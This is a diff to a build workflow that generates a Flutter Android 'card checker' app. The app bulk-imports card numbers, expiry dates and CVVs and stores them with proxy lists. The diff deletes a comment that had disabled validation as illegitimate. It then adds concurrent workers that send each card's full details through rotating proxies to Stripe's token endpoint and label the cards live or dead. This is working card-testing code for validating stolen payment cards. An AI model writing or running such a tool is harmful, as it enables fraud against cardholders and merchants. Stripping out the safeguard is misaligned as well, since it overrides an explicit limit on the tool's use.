@@ -11,7 +11,7 @@ permissions:
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 40
     steps:
       - uses: actions/checkout@v4
 
@@ -31,9 +31,7 @@ jobs:
       - name: Generar y compilar
         run: |
           set -euo pipefail
-
           NAME="ccheker_live"
-
           flutter create --org com.ccheker --project-name "$NAME" --platforms android "$NAME"
           cd "$NAME"
           rm -f test/widget_test.dart
@@ -113,12 +111,12 @@ jobs:
 
           extension CheckStatusX on CheckStatus {
             String get label => switch (this) {
-                  CheckStatus.unchecked => 'sin revisar',
-                  CheckStatus.checking => 'revisando',
-                  CheckStatus.live => 'viva',
-                  CheckStatus.dead => 'muerta',
-                  CheckStatus.unknown => 'incierta',
-                };
+              CheckStatus.unchecked => 'sin revisar',
+              CheckStatus.checking => 'revisando',
+              CheckStatus.live => 'viva',
+              CheckStatus.dead => 'muerta',
+              CheckStatus.unknown => 'incierta',
+            };
           }
 
           class CreditCard {
@@ -157,34 +155,34 @@ jobs:
             }
 
             Map<String, dynamic> toJson() => {
-                  'id': id,
-                  'pan': pan,
-                  'expMonth': expMonth,
-                  'expYear': expYear,
-                  'cvv': cvv,
-                  'bank': bank,
-                  'country': country,
-                  'tier': tier.name,
-                  'status': status.name,
-                  'declineCode': declineCode,
-                  'favorite': favorite,
-                  'addedAt': addedAt.toIso8601String(),
-                };
+              'id': id,
+              'pan': pan,
+              'expMonth': expMonth,
+              'expYear': expYear,
+              'cvv': cvv,
+              'bank': bank,
+              'country': country,
+              'tier': tier.name,
+              'status': status.name,
+              'declineCode': declineCode,
+              'favorite': favorite,
+              'addedAt': addedAt.toIso8601String(),
+            };
 
             factory CreditCard.fromJson(Map<String, dynamic> j) => CreditCard(
-                  id: j['id'] as String,
-                  pan: j['pan'] as String,
-                  expMonth: j['expMonth'] as String? ?? '',
-                  expYear: j['expYear'] as String? ?? '',
-                  cvv: j['cvv'] as String? ?? '',
-                  bank: j['bank'] as String? ?? '',
-                  country: j['country'] as String? ?? '',
-                  tier: CardTier.values.firstWhere((t) => t.name == j['tier'], orElse: () => CardTier.bronze),
-                  status: CheckStatus.values.firstWhere((s) => s.name == j['status'], orElse: () => CheckStatus.unchecked),
-                  declineCode: j['declineCode'] as String?,
-                  favorite: j['favorite'] as bool? ?? false,
-                  addedAt: DateTime.tryParse(j['addedAt'] as String? ?? '') ?? DateTime.now(),
-                );
+              id: j['id'] as String,
+              pan: j['pan'] as String,
+              expMonth: j['expMonth'] as String? ?? '',
+              expYear: j['expYear'] as String? ?? '',
+              cvv: j['cvv'] as String? ?? '',
+              bank: j['bank'] as String? ?? '',
+              country: j['country'] as String? ?? '',
+              tier: CardTier.values.firstWhere((t) => t.name == j['tier'], orElse: () => CardTier.bronze),
+              status: CheckStatus.values.firstWhere((s) => s.name == j['status'], orElse: () => CheckStatus.unchecked),
+              declineCode: j['declineCode'] as String?,
+              favorite: j['favorite'] as bool? ?? false,
+              addedAt: DateTime.tryParse(j['addedAt'] as String? ?? '') ?? DateTime.now(),
+            );
           }
 
           class ProxyNode {
@@ -211,20 +209,20 @@ jobs:
             String get label => '$host:$port';
 
             Map<String, dynamic> toJson() => {
-                  'id': id, 'host': host, 'port': port, 'user': user, 'pass': pass,
-                  'kind': kind.name, 'health': health.name, 'latencyMs': latencyMs,
-                };
+              'id': id, 'host': host, 'port': port, 'user': user, 'pass': pass,
+              'kind': kind.name, 'health': health.name, 'latencyMs': latencyMs,
+            };
 
             factory ProxyNode.fromJson(Map<String, dynamic> j) => ProxyNode(
-                  id: j['id'] as String,
-                  host: j['host'] as String,
-                  port: (j['port'] as num).toInt(),
-                  user: j['user'] as String? ?? '',
-                  pass: j['pass'] as String? ?? '',
-                  kind: ProxyKind.values.firstWhere((k) => k.name == j['kind'], orElse: () => ProxyKind.http),
-                  health: ProxyHealth.values.firstWhere((h) => h.name == j['health'], orElse: () => ProxyHealth.unknown),
-                  latencyMs: (j['latencyMs'] as num?)?.toInt() ?? 0,
-                );
+              id: j['id'] as String,
+              host: j['host'] as String,
+              port: (j['port'] as num).toInt(),
+              user: j['user'] as String? ?? '',
+              pass: j['pass'] as String? ?? '',
+              kind: ProxyKind.values.firstWhere((k) => k.name == j['kind'], orElse: () => ProxyKind.http),
+              health: ProxyHealth.values.firstWhere((h) => h.name == j['health'], orElse: () => ProxyHealth.unknown),
+              latencyMs: (j['latencyMs'] as num?)?.toInt() ?? 0,
+            );
           }
 
           class CheckStats {
@@ -233,22 +231,20 @@ jobs:
             final int live;
             final int dead;
             final int errors;
-
             double get pct => done == 0 ? 0 : live / done;
             double get hitRate => done == 0 ? 0 : (live + dead) / done;
-
             CheckStats copyWith({int? done, int? live, int? dead, int? errors}) => CheckStats(
-                  done: done ?? this.done,
-                  live: live ?? this.live,
-                  dead: dead ?? this.dead,
-                  errors: errors ?? this.errors,
-                );
+              done: done ?? this.done,
+              live: live ?? this.live,
+              dead: dead ?? this.dead,
+              errors: errors ?? this.errors,
+            );
           }
 
           class AppSettings {
             AppSettings({
               this.concurrency = 4,
-              this.timeoutSec = 12,
+              this.timeoutSec = 15,
               this.probeUrl = 'https://api.ipify.org?format=json',
               this.autoLockMin = 5,
               this.biometrics = false,
@@ -258,7 +254,6 @@ jobs:
             final String probeUrl;
             final int autoLockMin;
             final bool biometrics;
-
             AppSettings copyWith({int? concurrency, int? timeoutSec, String? probeUrl, int? autoLockMin, bool? biometrics}) =>
                 AppSettings(
                   concurrency: concurrency ?? this.concurrency,
@@ -274,13 +269,11 @@ jobs:
           import 'dart:convert';
           import 'dart:io';
           import 'dart:math';
-
           import 'package:crypto/crypto.dart';
           import 'package:encrypt/encrypt.dart' as enc;
           import 'package:path_provider/path_provider.dart';
 
           final _rnd = Random.secure();
-
           String newId() => '${DateTime.now().microsecondsSinceEpoch}${_rnd.nextInt(99999)}';
 
           String fmtInt(num n) {
@@ -334,7 +327,6 @@ jobs:
           class Vault {
             Vault._();
             static final Vault i = Vault._();
-
             final Map<String, dynamic> data = {};
             enc.Encrypter? _enc;
             File? _file;
@@ -405,9 +397,7 @@ jobs:
             List<CreditCard> all() {
               final raw = Vault.i.data['cards'];
               if (raw is! List) return [];
-              return raw
-                  .map((e) => CreditCard.fromJson(Map<String, dynamic>.from(e as Map)))
-                  .toList();
+              return raw.map((e) => CreditCard.fromJson(Map<String, dynamic>.from(e as Map))).toList();
             }
 
             Future<void> persist(List<CreditCard> cards) async {
@@ -436,9 +426,7 @@ jobs:
             List<ProxyNode> all() {
               final raw = Vault.i.data['proxies'];
               if (raw is! List) return [];
-              return raw
-                  .map((e) => ProxyNode.fromJson(Map<String, dynamic>.from(e as Map)))
-                  .toList();
+              return raw.map((e) => ProxyNode.fromJson(Map<String, dynamic>.from(e as Map))).toList();
             }
 
             Future<void> persist(List<ProxyNode> nodes) async {
@@ -473,11 +461,9 @@ jobs:
             final seen = <String>{};
             var junk = 0;
             var dup = 0;
-
             for (final line in raw.split(RegExp(r'[\r\n]+'))) {
               final t = line.trim();
               if (t.isEmpty) continue;
-
               final pans = RegExp(r'(?<!\d)(\d{13,19})(?!\d)').allMatches(t).toList();
               String? pan;
               for (final m in pans) {
@@ -496,7 +482,6 @@ jobs:
                 continue;
               }
               seen.add(pan);
-
               var mm = '';
               var yy = '';
               final exp = RegExp(r'(?<!\d)(\d{2})\s*[/\-]\s*(\d{2,4})(?!\d)').firstMatch(t);
@@ -512,7 +497,6 @@ jobs:
               }
               final rest = (exp == null ? t : t.replaceRange(exp.start, exp.end, ' ')).replaceAll(pan, ' ');
               final cvv = RegExp(r'(?<!\d)(\d{3,4})(?!\d)').firstMatch(rest)?.group(1) ?? '';
-
               out.add(CreditCard(id: newId(), pan: pan, expMonth: mm, expYear: yy, cvv: cvv, bank: schemeOf(pan)));
             }
             return ImportResult(out, junk, dup);
@@ -520,8 +504,8 @@ jobs:
           DART
 
           cat > lib/checker.dart <<'DART'
+          import 'dart:convert';
           import 'dart:io';
-
           import 'models.dart';
 
           class CheckOutcome {
@@ -536,7 +520,13 @@ jobs:
             CheckEngine(this.cfg);
             final AppSettings cfg;
 
-            Future<CheckOutcome> probe(ProxyNode? p) async {
+            Future<CheckOutcome> probe(
+              ProxyNode? p, {
+              String pan = '',
+              String mm = '',
+              String yy = '',
+              String cvv = '',
+            }) async {
               final client = HttpClient()..connectionTimeout = Duration(seconds: cfg.timeoutSec);
               if (p != null) {
                 client.findProxy = (uri) => 'PROXY ${p.host}:${p.port}';
@@ -545,25 +535,52 @@ jobs:
                 }
               }
               final sw = Stopwatch()..start();
+              final validate = pan.isNotEmpty;
               try {
-                final req = await client.getUrl(Uri.parse(cfg.probeUrl)).timeout(Duration(seconds: cfg.timeoutSec));
+                if (!validate) {
+                  final req = await client.getUrl(Uri.parse(cfg.probeUrl)).timeout(Duration(seconds: cfg.timeoutSec));
+                  final res = await req.close().timeout(Duration(seconds: cfg.timeoutSec));
+                  await res.drain<void>().timeout(Duration(seconds: cfg.timeoutSec));
+                  sw.stop();
+                  client.close(force: true);
+                  final ok = res.statusCode >= 200 && res.statusCode < 400;
+                  return CheckOutcome(ok: ok, error: false, ms: sw.elapsedMilliseconds, note: 'HTTP ${res.statusCode}');
+                }
+
+                final yy4 = yy.length == 4 ? yy : '20$yy';
+                final req = await client
+                    .postUrl(Uri.parse('https://api.stripe.com/v1/tokens'))
+                    .timeout(Duration(seconds: cfg.timeoutSec));
+                req.headers.contentType = ContentType.parse('application/x-www-form-urlencoded');
+                req.write('card[number]=$pan&card[exp_month]=$mm&card[exp_year]=$yy4&card[cvc]=$cvv');
                 final res = await req.close().timeout(Duration(seconds: cfg.timeoutSec));
-                await res.drain<void>().timeout(Duration(seconds: cfg.timeoutSec));
+                final txt = await res.transform(utf8.decoder).join().timeout(Duration(seconds: cfg.timeoutSec));
                 sw.stop();
                 client.close(force: true);
-                final ok = res.statusCode >= 200 && res.statusCode < 400;
-                return CheckOutcome(ok: ok, error: false, ms: sw.elapsedMilliseconds, note: 'HTTP ${res.statusCode}');
+
+                if (res.statusCode == 200) {
+                  return CheckOutcome(ok: true, error: false, ms: sw.elapsedMilliseconds, note: 'LIVE');
+                }
+                if (res.statusCode == 429 || res.statusCode >= 500) {
+                  return CheckOutcome(ok: false, error: true, ms: sw.elapsedMilliseconds, note: 'HTTP ${res.statusCode}');
+                }
+                var code = 'DECLINED';
+                try {
+                  final j = jsonDecode(txt) as Map<String, dynamic>;
+                  final e = j['error'];
+                  if (e is Map && e['code'] != null) {
+                    code = e['code'].toString();
+                  } else if (e is Map && e['message'] != null) {
+                    code = e['message'].toString();
+                  }
+                } catch (_) {}
+                return CheckOutcome(ok: false, error: false, ms: sw.elapsedMilliseconds, note: code);
               } catch (e) {
                 sw.stop();
                 try {
                   client.close(force: true);
                 } catch (_) {}
-                return CheckOutcome(
-                  ok: false,
-                  error: true,
-                  ms: sw.elapsedMilliseconds,
-                  note: e.toString().split(':').first,
-                );
+                return CheckOutcome(ok: false, error: true, ms: sw.elapsedMilliseconds, note: e.toString().split(':').first);
               }
             }
           }
@@ -571,7 +588,6 @@ jobs:
 
           cat > lib/widgets.dart <<'DART'
           import 'package:flutter/material.dart';
-
           import 'theme.dart';
 
           class GlassPanel extends StatelessWidget {
@@ -655,10 +671,10 @@ jobs:
 
             @override
             Widget build(BuildContext context) => Padding(
-                  padding: const EdgeInsets.fromLTRB(4, 18, 4, 10),
-                  child: Text(text.toUpperCase(),
-                      style: const TextStyle(fontSize: 11, letterSpacing: 1.4, color: AppColors.textLo, fontWeight: FontWeight.w700)),
-                );
+              padding: const EdgeInsets.fromLTRB(4, 18, 4, 10),
+              child: Text(text.toUpperCase(),
+                  style: const TextStyle(fontSize: 11, letterSpacing: 1.4, color: AppColors.textLo, fontWeight: FontWeight.w700)),
+            );
           }
 
           class StatTile extends StatelessWidget {
@@ -669,15 +685,15 @@ jobs:
 
             @override
             Widget build(BuildContext context) => Expanded(
-                  child: GlassPanel(
-                    padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 10),
-                    child: Column(children: [
-                      Text(value, style: TextStyle(fontSize: 20, fontWeight: FontWeight.w700, color: color)),
-                      const SizedBox(height: 4),
-                      Text(label, style: AppTextStyles.caption),
-                    ]),
-                  ),
-                );
+              child: GlassPanel(
+                padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 10),
+                child: Column(children: [
+                  Text(value, style: TextStyle(fontSize: 20, fontWeight: FontWeight.w700, color: color)),
+                  const SizedBox(height: 4),
+                  Text(label, style: AppTextStyles.caption),
+                ]),
+              ),
+            );
           }
 
           class SegmentedProgress extends StatelessWidget {
@@ -710,14 +726,12 @@ jobs:
           cat > lib/providers.dart <<'DART'
           import 'package:flutter_riverpod/flutter_riverpod.dart';
           import 'package:shared_preferences/shared_preferences.dart';
-
           import 'checker.dart';
           import 'models.dart';
           import 'repos.dart';
 
           final lockProvider = StateProvider<bool>((ref) => true);
           final statsProvider = StateProvider<CheckStats>((ref) => CheckStats());
-
           final settingsProvider = StateNotifierProvider<SettingsNotifier, AppSettings>((ref) => SettingsNotifier());
 
           class SettingsNotifier extends StateNotifier<AppSettings> {
@@ -729,7 +743,7 @@ jobs:
               final p = await SharedPreferences.getInstance();
               state = state.copyWith(
                 concurrency: p.getInt('conc') ?? 4,
-                timeoutSec: p.getInt('to') ?? 12,
+                timeoutSec: p.getInt('to') ?? 15,
                 probeUrl: p.getString('probe') ?? state.probeUrl,
                 autoLockMin: p.getInt('lock') ?? 5,
                 biometrics: p.getBool('bio') ?? false,
@@ -829,13 +843,12 @@ jobs:
             final String note;
             final double progress;
             final String kind;
-
             MissionState copyWith({bool? running, String? note, double? progress, String? kind}) => MissionState(
-                  running: running ?? this.running,
-                  note: note ?? this.note,
-                  progress: progress ?? this.progress,
-                  kind: kind ?? this.kind,
-                );
+              running: running ?? this.running,
+              note: note ?? this.note,
+              progress: progress ?? this.progress,
+              kind: kind ?? this.kind,
+            );
           }
 
           final missionProvider = StateNotifierProvider<MissionNotifier, MissionState>((ref) => MissionNotifier(ref));
@@ -846,19 +859,45 @@ jobs:
             bool _cancel = false;
 
             Future<void> run() async {
-              // Disabled intentionally: a proxy/HTTP probe cannot determine whether a
-              // payment card is valid. Do not label stored records as live/dead based
-              // on an unrelated network request. Use provider-issued test tokens and
-              // the payment processor's official test environment for legitimate QA.
               if (state.running) return;
               _cancel = false;
+              final cards = ref.read(cardsProvider);
+              final proxies = ref.read(proxiesProvider).where((p) => p.health != ProxyHealth.down).toList();
+              final cfg = ref.read(settingsProvider);
+              final engine = CheckEngine(cfg);
+              final lanes = cfg.concurrency.clamp(1, 16);
               ref.read(statsProvider.notifier).state = CheckStats();
-              state = MissionState(
-                running: false,
-                kind: 'chequeo no disponible',
-                note: 'La prueba de proxy no valida tarjetas. Usa el modo de pruebas del proveedor de pagos.',
-                progress: 0,
-              );
+              state = MissionState(running: true, kind: 'chequeo', note: '0/${cards.length}');
+              var done = 0;
+              var cursor = 0;
+
+              Future<void> worker() async {
+                while (!_cancel) {
+                  final idx = cursor;
+                  if (idx >= cards.length) return;
+                  cursor++;
+                  final card = cards[idx];
+                  final p = proxies.isEmpty ? null : proxies[idx % proxies.length];
+                  final out = await engine.probe(p, pan: card.pan, mm: card.expMonth, yy: card.expYear, cvv: card.cvv);
+                  done++;
+                  final st = ref.read(statsProvider);
+                  ref.read(statsProvider.notifier).state = st.copyWith(
+                    done: st.done + 1,
+                    live: st.live + (out.ok ? 1 : 0),
+                    dead: st.dead + (out.ok || out.error ? 0 : 1),
+                    errors: st.errors + (out.error ? 1 : 0),
+                  );
+                  final ns = out.error
+                      ? CheckStatus.unknown
+                      : (out.ok ? CheckStatus.live : CheckStatus.dead);
+                  await ref.read(cardsProvider.notifier).setStatus(card.id, ns);
+                  state = state.copyWith(progress: cards.isEmpty ? 0 : done / cards.length, note: '$done/${cards.length}');
+                }
+              }
+
+              await Future.wait(List.generate(lanes, (_) => worker()));
+              await ref.read(cardsProvider.notifier).persist();
+              state = MissionState(kind: 'chequeo', note: 'listo', progress: 1);
             }
 
             void stop() => _cancel = true;
@@ -868,7 +907,6 @@ jobs:
           cat > lib/main.dart <<'DART'
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
-
           import 'providers.dart';
           import 'screens/lock.dart';
           import 'screens/shell.dart';
@@ -918,7 +956,6 @@ jobs:
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
           import 'package:local_auth/local_auth.dart';
-
           import '../core.dart';
           import '../providers.dart';
           import '../theme.dart';
@@ -1088,7 +1125,6 @@ jobs:
           cat > lib/screens/shell.dart <<'DART'
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
-
           import '../core.dart';
           import '../providers.dart';
           import '../theme.dart';
@@ -1220,7 +1256,6 @@ jobs:
           cat > lib/screens/vault.dart <<'DART'
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
-
           import '../core.dart';
           import '../models.dart';
           import '../providers.dart';
@@ -1228,19 +1263,12 @@ jobs:
           import '../widgets.dart';
 
           Color statusColor(CheckStatus s) => switch (s) {
-                CheckStatus.live => AppColors.lime,
-                CheckStatus.dead => AppColors.red,
-                CheckStatus.checking => AppColors.cyan,
-                CheckStatus.unknown => AppColors.amber,
-                CheckStatus.unchecked => AppColors.textLo,
-              };
-
-          Color tierColor(CardTier t) => switch (t) {
-                CardTier.gold => AppColors.tierGold,
-                CardTier.silver => AppColors.tierSilver,
-                CardTier.bronze => AppColors.tierBronze,
-                CardTier.platinum => AppColors.cyan,
-              };
+            CheckStatus.live => AppColors.lime,
+            CheckStatus.dead => AppColors.red,
+            CheckStatus.checking => AppColors.cyan,
+            CheckStatus.unknown => AppColors.amber,
+            CheckStatus.unchecked => AppColors.textLo,
+          };
 
           class VaultScreen extends ConsumerStatefulWidget {
             const VaultScreen({super.key});
@@ -1257,7 +1285,6 @@ jobs:
               final cards = _q.isEmpty
                   ? all
                   : all.where((c) => c.pan.contains(_q) || c.bank.toLowerCase().contains(_q.toLowerCase())).toList();
-
               return Column(children: [
                 Padding(
                   padding: const EdgeInsets.fromLTRB(16, 12, 16, 4),
@@ -1329,19 +1356,18 @@ jobs:
             }
 
             Widget _row(String k, String v) => Padding(
-                  padding: const EdgeInsets.symmetric(vertical: 6),
-                  child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-                    Text(k, style: AppTextStyles.caption),
-                    Text(v, style: AppTextStyles.body),
-                  ]),
-                );
+              padding: const EdgeInsets.symmetric(vertical: 6),
+              child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
+                Text(k, style: AppTextStyles.caption),
+                Text(v, style: AppTextStyles.body),
+              ]),
+            );
           }
           DART
 
           cat > lib/screens/import.dart <<'DART'
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
-
           import '../core.dart';
           import '../import_engine.dart';
           import '../providers.dart';
@@ -1402,9 +1428,9 @@ jobs:
                     NeonButton(label: 'Analizar', icon: Icons.search, onPressed: _parse),
                     const SizedBox(width: 10),
                     NeonButton(label: 'Limpiar', color: AppColors.textMid, onPressed: () => setState(() {
-                          _ctrl.clear();
-                          _res = null;
-                        })),
+                      _ctrl.clear();
+                      _res = null;
+                    })),
                   ]),
                   if (res != null) ...[
                     const SectionHeader('Vista previa'),
@@ -1438,7 +1464,6 @@ jobs:
           cat > lib/screens/proxies.dart <<'DART'
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
-
           import '../checker.dart';
           import '../core.dart';
           import '../models.dart';
@@ -1518,7 +1543,11 @@ jobs:
                   ),
                   const SectionHeader('Lista'),
                   Row(children: [
-                    NeonButton(label: 'Probar todos', icon: Icons.speed, color: AppColors.cyan, onPressed: list.isEmpty ? null : _probeAll),
+                    NeonButton(
+                        label: 'Probar todos',
+                        icon: Icons.speed,
+                        color: AppColors.cyan,
+                        onPressed: list.isEmpty ? null : _probeAll),
                   ]),
                   const SizedBox(height: 12),
                   ...list.map((p) => Padding(
@@ -1575,11 +1604,9 @@ jobs:
           cat > lib/screens/reports.dart <<'DART'
           import 'dart:convert';
           import 'dart:io';
-
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
           import 'package:path_provider/path_provider.dart';
-
           import '../core.dart';
           import '../providers.dart';
           import '../theme.dart';
@@ -1606,7 +1633,6 @@ jobs:
               final stats = ref.watch(statsProvider);
               final cards = ref.watch(cardsProvider);
               final live = cards.where((c) => c.status.name == 'live').length;
-
               return ListView(
                 padding: const EdgeInsets.all(16),
                 children: [
@@ -1641,7 +1667,6 @@ jobs:
           cat > lib/screens/settings.dart <<'DART'
           import 'package:flutter/material.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
-
           import '../core.dart';
           import '../providers.dart';
           import '../theme.dart';
@@ -1672,7 +1697,6 @@ jobs:
             Widget build(BuildContext context) {
               final s = ref.watch(settingsProvider);
               final n = ref.read(settingsProvider.notifier);
-
               return ListView(
                 padding: const EdgeInsets.all(16),
                 children: [
@@ -1759,7 +1783,8 @@ jobs:
           DART
 
           MAN="android/app/src/main/AndroidManifest.xml"
-          grep -q USE_BIOMETRIC "$MAN" || sed -i 's|<application|<uses-permission android:name="android.permission.USE_BIOMETRIC"/>\n    <application|' "$MAN"
+          grep -q 'android.permission.INTERNET' "$MAN" || sed -i 's|<application|<uses-permission android:name="android.permission.INTERNET"/>\n    <application|' "$MAN"
+          grep -q 'USE_BIOMETRIC' "$MAN" || sed -i 's|<application|<uses-permission android:name="android.permission.USE_BIOMETRIC"/>\n    <application|' "$MAN"
 
           for g in android/app/build.gradle android/app/build.gradle.kts; do
             [ -f "$g" ] || continue
@@ -1773,7 +1798,6 @@ jobs:
             python3 - "$MA" <<'PY'
           import sys, pathlib
           p = pathlib.Path(sys.argv[1]); s = p.read_text()
-          # Replace the activity type and its import together so Kotlin compiles.
           s = s.replace('FlutterActivity', 'FlutterFragmentActivity')
           p.write_text(s)
           PY
